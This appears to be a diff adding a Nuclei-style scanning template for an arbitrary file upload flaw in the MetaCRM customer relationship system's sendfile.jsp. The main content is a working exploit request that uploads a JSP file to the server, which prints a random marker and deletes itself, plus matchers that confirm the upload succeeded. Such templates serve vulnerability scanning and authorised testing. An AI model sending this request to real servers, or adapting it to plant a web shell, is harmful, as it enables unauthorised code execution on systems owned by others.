@@ -1,0 +1,42 @@
+id: metasoft-crm-sendfile-fileupload
+info:
+  name: MetaCRM 客户关系管理系统 sendfile.jsp 任意文件上传
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/main/MetaCRM/MetaCRM%20%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20sendfile.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips: file path in response
+    repair:
+    version:
+  tags: fileupload,metasoft
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /business/common/importdata/sendfile.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpW22
+
+        ------WebKitFormBoundary03rNBzFMIytvpW22
+        Content-Disposition: form-data; name="file"; filename="1.jsp"
+
+        <%out.print("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundary03rNBzFMIytvpW22--
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'webapps','userfile')
+        condition: and
